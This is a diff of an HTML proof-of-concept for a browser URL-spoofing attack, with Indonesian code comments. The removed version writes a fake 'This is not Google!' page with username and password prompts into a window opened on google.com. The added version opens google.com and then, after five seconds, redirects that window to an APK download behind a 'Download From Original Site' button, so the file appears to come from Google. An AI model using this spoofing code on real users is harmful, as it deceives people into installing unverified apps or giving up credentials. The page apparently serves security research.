@@ -1,23 +1,31 @@
-    <script>
-      function spoof() {
-        // Buka page baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/", "_blank");
 
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-  <h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
-    </script>
+<html>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://google.com', 'x');
+	setTimeout(function(){
+		window.open('https://k4tedu.github.io/Bottom-Minibar-Spoof/test.apk', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
+</html>
